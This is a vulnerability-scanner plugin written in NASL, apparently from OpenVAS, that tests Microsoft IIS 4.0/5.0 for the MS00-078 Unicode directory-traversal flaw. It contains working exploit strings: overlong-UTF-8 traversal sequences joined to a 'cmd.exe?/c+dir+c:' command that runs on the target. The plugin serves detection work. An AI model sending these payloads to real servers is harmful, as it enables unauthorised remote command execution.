CPE = "cpe:/a:microsoft:internet_information_services";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.101014" );
	script_version( "2020-11-25T11:26:55+0000" );
	script_tag( name: "last_modification", value: "2020-11-25 11:26:55 +0000 (Wed, 25 Nov 2020)" );
	script_tag( name: "creation_date", value: "2009-03-16 23:15:41 +0100 (Mon, 16 Mar 2009)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2000-0884" );
	script_bugtraq_id( 1806 );
	script_name( "Microsoft MS00-078 security check" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2009 Christian Eric Edjenguele" );
	script_family( "Windows : Microsoft Bulletins" );
	script_dependencies( "secpod_ms_iis_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "IIS/installed" );
	script_xref( name: "URL", value: "http://support.microsoft.com/kb/269862/en-us" );
	script_tag( name: "solution", value: "There is not a new patch for this vulnerability. Instead, it is eliminated
  by the patch that accompanied Microsoft Security Bulletin MS00-057. Please see the references for more information." );
	script_tag( name: "summary", value: "Microsoft IIS 4.0 and 5.0 are affected by a web server trasversal vulnerability." );
	script_tag( name: "impact", value: "This vulnerability could potentially allow a visitor to a web site to take a wide
  range of destructive actions against it, including running programs on it." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
r_cmd = "/winnt/system32/cmd.exe?/c+dir+c:";
d = make_list( "/scripts/",
	 "/msadc/",
	 "/iisadmpwd/",
	 "/_vti_bin/",
	 "/_mem_bin/",
	 "/exchange/",
	 "/pbserver/",
	 "/rpc/",
	 "/cgi-bin/",
	 "/" );
uc = make_list( "%c0%af",
	 "%c0%9v",
	 "%c1%c1",
	 "%c0%qf",
	 "%c1%8s",
	 "%c1%9c",
	 "%c1%pc",
	 "%c1%1c",
	 "%c0%2f",
	 "%e0%80%af" );
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
for webdir in d {
	for uni_code in uc {
		url = strcat( webdir, "..", uni_code, "..", uni_code, "..", uni_code, "..", uni_code, "..", uni_code, "..", r_cmd );
		qry = NASLString( "/" + url );
		req = http_get( item: qry, port: port );
		reply = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
		if(reply){
			header_server = egrep( pattern: "Server", string: reply, icase: TRUE );
			if(( ContainsString( header_server, "Microsoft-IIS" ) ) && ( egrep( pattern: "HTTP/1.[01] 200", string: reply ) ) && ( ( ContainsString( reply, "<dir>" ) ) || ContainsString( reply, "directory of" ) )){
				report = NASLString( "Exploit String", url, " for vulnerability:\\n", reply, "\\n" );
				security_message( port: port, data: report );
				exit( 0 );
			}
		}
	}
}
exit( 99 );

